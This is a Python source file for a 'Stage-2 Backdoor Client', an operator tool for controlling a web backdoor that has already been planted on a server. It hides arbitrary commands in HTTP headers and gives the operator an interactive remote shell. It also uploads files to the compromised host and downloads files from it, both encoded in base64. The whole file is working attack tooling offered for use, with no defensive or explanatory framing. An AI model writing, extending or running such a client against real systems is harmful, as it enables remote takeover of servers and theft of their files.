#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Stage-2 Backdoor Client ..(beta)..
-----------------------
Adds:
- File upload/download (raw or base64)
- Multiple headers
- Command chaining
- REPL quality-of-life (history, colors, local commands)
- Safer parsing, extendable protocol
"""

import argparse
import base64
import os
import readline
import shlex
from typing import List, Optional, Dict

import requests
from requests import Response


# ----------------------------
#   Color Helpers
# ----------------------------

class C:
    R = "\033[31m"
    G = "\033[32m"
    Y = "\033[33m"
    B = "\033[34m"
    W = "\033[37m"
    RESET = "\033[0m"


def color(text: str, c: str) -> str:
    return f"{c}{text}{C.RESET}"


# ----------------------------
#   Backdoor Client
# ----------------------------

class BackdoorClient:
    """
    Header-based backdoor client with optional file transfer utilities.
    """

    def __init__(
        self,
        host: str,
        port: int,
        headers: List[str],
        use_https: bool = False,
        path: str = "/",
        method: str = "GET",
        timeout: int = 5,
    ) -> None:
        self.host = host
        self.port = port
        self.headers = headers
        self.use_https = use_https
        self.path = path if path.startswith("/") else f"/{path}"
        self.method = method.upper()
        self.timeout = timeout
        self.base_url = f"{'https' if use_https else 'http'}://{host}:{port}{self.path}"

    # --------------------------------------------------
    #  Send command to remote backdoor
    # --------------------------------------------------
    def send(self, command: str) -> Optional[str]:
        """
        Send a single command using all configured headers.
        """

        # Pack the command into all headers
        req_headers = {h: command for h in self.headers}

        try:
            if self.method == "POST":
                resp: Response = requests.post(self.base_url, headers=req_headers, timeout=self.timeout)
            else:
                resp = requests.get(self.base_url, headers=req_headers, timeout=self.timeout)

            if resp.status_code == 200:
                return resp.text.strip() if resp.text else ""
            else:
                return f"[!] HTTP {resp.status_code}\n{resp.text.strip()}"

        except requests.exceptions.RequestException as e:
            return f"[!] Request failed: {e}"

    # --------------------------------------------------
    #  File Transfer
    # --------------------------------------------------

    def upload_base64(self, local_path: str, remote_path: str) -> Optional[str]:
        """
        Upload a file as base64 and instruct remote to decode it.
        """
        if not os.path.exists(local_path):
            return f"[!] Local file not found: {local_path}"

        with open(local_path, "rb") as f:
            encoded = base64.b64encode(f.read()).decode()

        command = f"UPLOAD_BASE64:{remote_path}:{encoded}"
        return self.send(command)

    def download_base64(self, remote_path: str, local_path: str) -> Optional[str]:
        """
        Request remote file as base64 and write to local file.
        """
        command = f"DOWNLOAD_BASE64:{remote_path}"
        resp = self.send(command)

        if resp and resp.startswith("B64:"):
            try:
                b64_data = resp[4:]
                raw = base64.b64decode(b64_data)
                with open(local_path, "wb") as f:
                    f.write(raw)
                return f"[+] Saved to {local_path}"
            except Exception as e:
                return f"[!] Base64 decode failed: {e}"

        return f"[!] Unexpected response: {resp}"

    # --------------------------------------------------
    #  Interactive REPL utilities
    # --------------------------------------------------

    def local_cmd(self, cmd: str) -> Optional[str]:
        """
        Run *local* operator-side commands in REPL.
        """
        parts = shlex.split(cmd)

        if parts[0] == "lpwd":
            return os.getcwd()

        if parts[0] == "lcd" and len(parts) > 1:
            try:
                os.chdir(parts[1])
                return f"[+] Changed directory to {os.getcwd()}"
            except Exception as e:
                return f"[!] {e}"

        if parts[0] == "lls":
            return "\n".join(os.listdir(os.getcwd()))

        return "[!] Unknown local command."

    # --------------------------------------------------
    #  REPL Shell
    # --------------------------------------------------

    def interactive(self) -> None:
        print(color(f"[*] Connected to {self.base_url}", C.G))
        print(color(f"[*] Headers: {self.headers}", C.B))
        print("[*] Type `exit` to quit.")
        print("[*] Local commands: lpwd, lcd <dir>, lls")
        print("[*] Upload: upload <local> <remote>")
        print("[*] Download: download <remote> <local>")
        print()

        try:
            while True:
                try:
                    cmd = input(color("$ ", C.Y)).strip()
                except EOFError:
                    break

                if not cmd:
                    continue

                # Exit
                if cmd.lower() in ("exit", "quit"):
                    print("[*] Exiting.")
                    return

                # Local commands
                if cmd.startswith("l"):
                    print(self.local_cmd(cmd))
                    continue

                # File upload
                if cmd.startswith("upload "):
                    _, local, remote = cmd.split(maxsplit=2)
                    print(self.upload_base64(local, remote))
                    continue

                # File download
                if cmd.startswith("download "):
                    _, remote, local = cmd.split(maxsplit=2)
                    print(self.download_base64(remote, local))
                    continue

                # Remote execution
                out = self.send(cmd)
                if out:
                    print(out)

        except KeyboardInterrupt:
            print("\n[*] Interrupted.")


# ----------------------------
#   Arg Parser
# ----------------------------

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Advanced backdoor client (Stage-2)",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    parser.add_argument("host")
    parser.add_argument("port", type=int)
    parser.add_argument(
        "-H", "--header", action="append", default=["Backdoor"],
        help="Header(s) to use (can specify multiple)"
    )
    parser.add_argument("--cmd", help="Run a single command then exit")
    parser.add_argument("--https", action="store_true", help="Use HTTPS")
    parser.add_argument("--path", default="/", help="Custom request path")
    parser.add_argument("--method", choices=["GET", "POST"], default="GET")
    parser.add_argument("--timeout", type=int, default=5)

    return parser


# ----------------------------
#   Main Entrypoint
# ----------------------------

def main():
    args = build_parser().parse_args()

    client = BackdoorClient(
        host=args.host,
        port=args.port,
        headers=args.header,
        use_https=args.https,
        path=args.path,
        method=args.method,
        timeout=args.timeout,
    )

    if args.cmd:
        print(client.send(args.cmd))
    else:
        client.interactive()


if __name__ == "__main__":
    main()
